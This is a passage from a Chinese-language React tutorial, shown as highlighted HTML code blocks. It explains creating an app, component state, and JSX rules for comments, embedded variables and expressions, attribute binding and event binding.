class="line"><span class="keyword">import</span> <span class="title class_">React</span> <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span> <span class="comment">// 使用JSX语法必须引入react</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">ReactDOM</span> <span class="keyword">from</span> <span class="string">&#x27;react-dom&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App.js&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">ReactDOM</span>.<span class="title function_">render</span>(<span class="language-xml"><span class="tag">&lt;<span class="name">App</span> /&gt;</span></span>),</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;root&#x27;</span>))</span><br></pre></td></tr></table></figure><p><br />其中，<code>root</code> 是 <code>index.html</code> 模版里的元素，渲染出来的 App 组件放在此处。</p><p>下面我们来尝试修改 <code>App.js</code> 文件：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// src/App.js</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">React</span> <span class="keyword">from</span> <span class="string">&quot;react&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./App.css&quot;</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;App&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">header</span> <span class="attr">className</span>=<span class="string">&quot;App-header&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>hello world<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">header</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">App</span>;</span><br></pre></td></tr></table></figure><p>修改完保存之后，页面就会自动刷新，显示如下：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1500604/1605447084460-eaca666c-f277-496f-a7ca-5c0239cfc4c0.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1500604/1605447084460-eaca666c-f277-496f-a7ca-5c0239cfc4c0.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>至此，我们就完成了一个 React 应用的创建。</p><p>那 React 的数据在哪里定义呢，<code>Vue</code>是在<code>data</code>中定义数据，而<code>React</code>是在<code>state</code>中定义数据。</p><p>在组件中的数据，我们可以分成两类： <br />● 参与界面更新的数据：当数据变量时，需要更新组件渲染的内容<br />● 不参与界面更新的数据：当数据变量时，不需要更新将组建渲染的内容</p><p>参与界面更新的数据我们也可以称之为是参与数据流，这个数据是定义在当前对象的 state 中 <br />● 我们可以通过在构造函数中 <code>this.state = &#123;定义的数据&#125;</code> <br />● 当我们的数据发生变化时，我们可以调用 <code>this.setState</code> 来更新数据，并且通知 React 进行 update 操作<br />● 在进行 update 操作时，就会重新调用<code>render</code>函数，并且使用最新的数据，来渲染界面</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">App</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">pops</span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>(props);</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">state</span> = &#123;</span><br><span class="line">      <span class="attr">message</span>: <span class="string">&quot;hello world!&quot;</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="sP5kP"></a></p><h2 id="五、初识-JSX"><a href="#五、初识-JSX" class="headerlink" title="五、初识 JSX"></a>五、初识 JSX</h2><p><a name="Sdpnk"></a></p><h3 id="1-什么是-JSX"><a href="#1-什么是-JSX" class="headerlink" title="1. 什么是 JSX"></a>1. 什么是 JSX</h3><p>我们来看一个变量的声明：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> element = <span class="language-xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello, world!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span>;</span><br></pre></td></tr></table></figure><p>这个变量声明既不是字符串也不是 HTML，它被称为 JSX，是一种 JavaScript 的语法扩展（eXtension），也在很多地方称之为 JavaScript XML，因为看起就是一段 XML 语法。它用于描述我们的 UI 界面，并且其完成可以和 JavaScript 融合在一起使用；<br><a name="es00w"></a></p><h3 id="2-为什么使用-JSX"><a href="#2-为什么使用-JSX" class="headerlink" title="2. 为什么使用 JSX"></a>2. 为什么使用 JSX</h3><p>那为什么 React 要选择使用 JSX 呢？<br />（1） React 认为渲染逻辑本质上与其他 UI 逻辑存在内在耦合<br />● 比如 UI 需要绑定事件（button、a 原生等等）；<br />● 比如 UI 中需要展示数据状态，在某些状态发生改变时，又需要改变 UI； <br />（2）它们之间是密不可分，所以 React 没有将标记分离到不同的文件中，而是将它们组合到了一起，这个地方就是组件（Component）；</p><p>其实，JSX 是嵌入到 JavaScript 中的一种结构语法；</p><p><strong>JSX 的优点：</strong><br />● 使用熟悉的语法定义 HTML 元素，提供更加语义化的标签，使用 JSX 编写模板更简单快速；<br />● 更加直观：JSX 让小组件更加简单、明了、直观； <br />● 抽象了 React 元素的创建过程，使得编写组件变得更加简单； <br />● JSX 执行更快，因为它在编译为 JavaScript 代码后进行了优化； <br />● JSX 是类型安全的，在编译过程中就能发现错误； <br />● 防注入攻击，所有的内容在渲染之前都被转换成了字符串，可以有效地防止 XSS（跨站脚本） 攻击。<br><a name="WhkLQ"></a></p><h3 id="3-JSX-书写规范"><a href="#3-JSX-书写规范" class="headerlink" title="3. JSX 书写规范"></a>3. JSX 书写规范</h3><p>JSX 的书写规范如下：<br />● JSX 的顶层<strong>只能有一个根元素</strong>，所以我们很多时候会在外层包裹一个 div 原生（或者使用 Fragment，文档片段）；<br />● 为了方便阅读，我们通常在 jsx 的外层包裹一个小括号()，这样可以方便阅读，并且 jsx 可以进行换行书写；<br />● JSX 中的标签可以是单标签，也可以是双标签；注意：如果是单标签，必须以&#x2F;&gt;结尾；<br />● 在使用变量时，我们可以将其放在一个大括号中，大括号内放置任何有效的 JavaScript 表达式</p><p><strong>下面来是一个计数器的例子：</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">App</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">pops</span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>(props);</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">state</span> = &#123;</span><br><span class="line">      <span class="attr">counter</span>: <span class="number">0</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>当前计数: &#123;this.state.counter&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;this.increment&#125;</span>&gt;</span>+1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;this.decrement.bind(this)&#125;</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">increment</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">setState</span>(&#123;</span><br><span class="line">      <span class="attr">counter</span>: <span class="variable language_">this</span>.<span class="property">state</span>.<span class="property">counter</span> + <span class="number">1</span>,</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">decrement</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">setState</span>(&#123;</span><br><span class="line">      <span class="attr">counter</span>: <span class="variable language_">this</span>.<span class="property">state</span>.<span class="property">counter</span> - <span class="number">1</span>,</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">ReactDOM</span>.<span class="title function_">render</span>(<span class="language-xml"><span class="tag">&lt;<span class="name">App</span> /&gt;</span></span>, <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;app&quot;</span>));</span><br></pre></td></tr></table></figure><p><a name="EFDKs"></a></p><h3 id="4-JSX-注释"><a href="#4-JSX-注释" class="headerlink" title="4. JSX 注释"></a>4. JSX 注释</h3><p>JSX 的注释和其他框架略有不同，通常有三种方法：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> (</span><br><span class="line">          <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            &#123;/* 单行注释 */&#125;</span></span><br><span class="line"><span class="language-xml">            &#123;/*</span></span><br><span class="line"><span class="language-xml">                多行注释</span></span><br><span class="line"><span class="language-xml">            */&#125;</span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Hello World<span class="tag">&lt;/<span class="name">h2</span>&gt;</span> // 行尾注释</span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">        )</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p><a name="F09iU"></a></p><h3 id="5-JSX-嵌入变量"><a href="#5-JSX-嵌入变量" class="headerlink" title="5. JSX 嵌入变量"></a>5. JSX 嵌入变量</h3><p>在 JSX 中嵌入变量时，通常使用一个大括号包裹，不同类型的变量的显示效果是不一样的：<br />（1）情况一：当变量是 Number、String、Array 类型时，可以直接显示</p><p>（2）情况二：当变量是 null、undefined、Boolean 类型时，内容为空； <br />● 如果希望可以显示 null、undefined、Boolean，那么需要转成字符串；<br />● 转换的方式有很多，比如<code>toString</code>方法、和<code>空字符串拼接</code>，<code>String(变量)</code>等方式；</p><p>（3） 情况三：对象类型不能作为子元素（not valid as a React child）</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">App</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">props</span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>(props);</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">state</span> = &#123;</span><br><span class="line">      <span class="comment">// 1.在&#123;&#125;中可以正常显示显示的内容</span></span><br><span class="line">      <span class="attr">name</span>: <span class="string">&quot;why&quot;</span>, <span class="comment">// String</span></span><br><span class="line">      <span class="attr">age</span>: <span class="number">18</span>, <span class="comment">// Number</span></span><br><span class="line">      <span class="attr">names</span>: [<span class="string">&quot;abc&quot;</span>, <span class="string">&quot;cba&quot;</span>, <span class="string">&quot;bac&quot;</span>], <span class="comment">// Array</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">// 2.在&#123;&#125;中不能显示(忽略)</span></span><br><span class="line">      <span class="attr">test1</span>: <span class="literal">null</span>, <span class="comment">// null</span></span><br><span class="line">      <span class="attr">test2</span>: <span class="literal">undefined</span>, <span class="comment">// undefined</span></span><br><span class="line">      <span class="attr">test3</span>: <span class="literal">true</span>, <span class="comment">// Boolean</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">// 3.对象不能作为jsx的子类</span></span><br><span class="line">      <span class="attr">friend</span>: &#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&quot;zhangsan&quot;</span>,</span><br><span class="line">        <span class="attr">age</span>: <span class="number">40</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;this.state.name&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;this.state.age&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;this.state.names&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;this.state.test1 + &quot;&quot;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;this.state.test2 + &quot;&quot;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;this.state.test3.toString()&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;this.state.friend&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="cSt4f"></a></p><h3 id="6-JSX-嵌入表达式"><a href="#6-JSX-嵌入表达式" class="headerlink" title="6. JSX 嵌入表达式"></a>6. JSX 嵌入表达式</h3><p>在 JSX 中嵌入表达式：<br />● 运算表达式 <br />● 三元运算符 <br />● 进行函数调用</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="comment">// 对state中的变量进行解构赋值</span></span><br><span class="line">        <span class="keyword">const</span> &#123; firstname, lastname, isLogin &#125; = <span class="variable language_">this</span>.<span class="property">state</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (</span><br><span class="line">          <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            &#123;/*1.运算符表达式*/&#125;</span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123; firstname + &quot; &quot; + lastname &#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;20 * 50&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">            &#123;/*2.三元表达式*/&#125;</span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123; isLogin ? &quot;欢迎回来~&quot;: &quot;请先登录~&quot; &#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">            &#123;/*3.进行函数调用*/&#125;</span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;this.getFullName()&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">        )</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="title function_">getFullName</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">state</span>.<span class="property">firstname</span> + <span class="string">&quot; &quot;</span> + <span class="variable language_">this</span>.<span class="property">state</span>.<span class="property">lastname</span>;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p><a name="sh9mQ"></a></p><h3 id="7-JSX-绑定属性"><a href="#7-JSX-绑定属性" class="headerlink" title="7. JSX 绑定属性"></a>7. JSX 绑定属性</h3><p>常见的绑定的属性有以下几种：<br />● 元素都会有 title 属性<br />● img 元素会有 src 属性<br />● a 元素会有 href 属性<br />● 元素可能需要绑定 class<br />● 原生使用内联样式 style<br />我们可以使用大括号来给元素绑定属性：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">App</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">props</span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>(props);</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">state</span> = &#123;</span><br><span class="line">      <span class="attr">title</span>: <span class="string">&quot;标题&quot;</span>,</span><br><span class="line">      <span class="attr">imgUrl</span>:</span><br><span class="line">        <span class="string">&quot;http://p2.music.126.net/L8IDEWMk_6vyT0asSkPgXw==/109951163990535633.jpg&quot;</span>,</span><br><span class="line">      <span class="attr">link</span>: <span class="string">&quot;http://www.baidu.com&quot;</span>,</span><br><span class="line">      <span class="attr">active</span>: <span class="literal">true</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; title, imgUrl, link, active &#125; = <span class="variable language_">this</span>.<span class="property">state</span>;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        &#123;/* 1.绑定普通属性 */&#125;</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">h2</span> <span class="attr">title</span>=<span class="string">&#123;title&#125;</span>&gt;</span>我是标题<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#123;getSizeImage(imgUrl,</span> <span class="attr">140</span>)&#125; <span class="attr">alt</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#123;link&#125;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          百度一下</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">        &#123;/* 2.绑定class */&#125;</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;box title&quot;</span>&gt;</span>我是div元素<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&#123;</span>&quot;<span class="attr">box</span> <span class="attr">title</span> &quot; + (<span class="attr">active</span> ? &quot;<span class="attr">active</span>&quot; <span class="attr">:</span> &quot;&quot;)&#125;&gt;</span></span></span><br><span class="line"><span class="language-xml">          我也是div元素</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">htmlFor</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">        &#123;/* 3.绑定style */&#125;</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&#123;&#123;</span> <span class="attr">color:</span> &quot;<span class="attr">red</span>&quot;, <span class="attr">fontSize:</span> &quot;<span class="attr">50px</span>&quot; &#125;&#125;&gt;</span></span></span><br><span class="line"><span class="language-xml">          我是div,绑定style属性</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getSizeImage</span>(<span class="params">imgUrl, size</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> imgUrl + <span class="string">`?param=<span class="subst">$&#123;size&#125;</span>x<span class="subst">$&#123;size&#125;</span>`</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br /><strong>注意：</strong><br />● 上面我们在给元素绑定<code>class</code>时，由于我们写的是 JSX 语法，它是和<code>JavaScript</code>的语法混在一起的，所以我们如果直接使用 JavaScript 中的关键字<code>class</code>就不太好，所以我们可以使用<code>className</code>来代替<code>class</code>，在<code>label</code>标签中，通常使用的是的<code>for</code>来绑定属性，但是 for 也是 JavaScript 中的关键字，所以使用<code>htmlFor</code>来代替。</p><p>● 如果我们想要给<code>className</code>添加值，就要使用 JavaScript 来给他动态添加。</p><p>● 在给元素绑定<code>style</code>时，需要注意，外层的大括号是用 JSX 语法往内部嵌套 JavaScript 代码。而内部的大括号是一个对象，它里面是键值对，表示元素的样式属性及属性值。</p><p>● 在给元素绑定<code>style</code>时，如果元素的属性值是一个值，就要加上双引号。当属性是由多个单词组成的时候，需要用驼峰命名法来表示，例如：<code>fontSize</code>。<br><a name="C3Dxj"></a></p><h3 id="8-JSX-绑定事件"><a href="#8-JSX-绑定事件" class="headerlink" title="8. JSX 绑定事件"></a>8. JSX 绑定事件</h3><p>在 JSX 中绑定事件时，可以使用以下方式：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;button onClick=&#123;<span class="variable language_">this</span>.<span class="property">btnClick</span>&#125;&gt;按钮&lt;/button&gt;</span><br></pre></td></tr></table></figure><p>可以看出 React 元素的事件处理和 DOM 元素的很相似，但存在一些语法上的差异： <br />● React 的事件采用驼峰式命名，而不是纯小写的方式； <br />● 使用 JSX 语法时，需要传入一个函数作为事件处理函数，而不是一个字符串； <br />● <strong>使用函数时不能加括号，不然会直接执行</strong>。</p><p>需要注意的是，如果我们绑定的事件函数中，如果使用到了当前组件对象中的属性，我们无法使用 this 直接获取 state 中的数据。这是因为，我们当前调用的函数，不是在元素上直接调用它的，而是 React 的内部发现这个按钮绑定了一个事件，就会在内部对这个函数做了一个回调，他拿到这个方法 btnClick 之后，就对其使用了<code>btnClick.call()</code>，并为其传递了一个参数<code>undefined</code>，也就是在执行这个函数的时候，给它绑定了一个动态的<code>this</code>，<code>this</code>指向了<code>undefined</code>。</p><p><strong>注意：</strong>在 React 中不能使用 <code>return false</code> 的方式阻止事件的默认行为，必须要显式的调用事件对象的 <code>preventDefault</code> 方法来阻止事件的默认行为。</p><p>这里补充一下<strong>this 的指向问题</strong>：<br />在类中直接定义一个函数，并且将这个函数绑定到<code>html</code>原生的<code>onClick</code>事件上，当前这个函数的<code>this</code>默认情况下指向是<code>undefined</code>。因为在正常的 DOM 操作中，监听点击，监听函数中的 this 其实是节点对象（比如说是<code>button</code>对象）。</p><p>因为 React 并不是直接渲染成真实的 DOM，我们所编写的 button 只是一个<code>语法糖</code>，它的本质 React 的 Element 对象。那么在这里发生监听的时候，react 给我们的函数绑定的 this，默认情况下就是一个 undefined；</p><p>我们在绑定的函数中，可能想要使用当前对象，比如执行 <code>this.setState</code> 函数，就必须拿到当前对象的 this，我们就需要在传入函数时，给这个函数直接绑定 this，类似于下面的写法：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;button onClick=&#123;<span class="variable 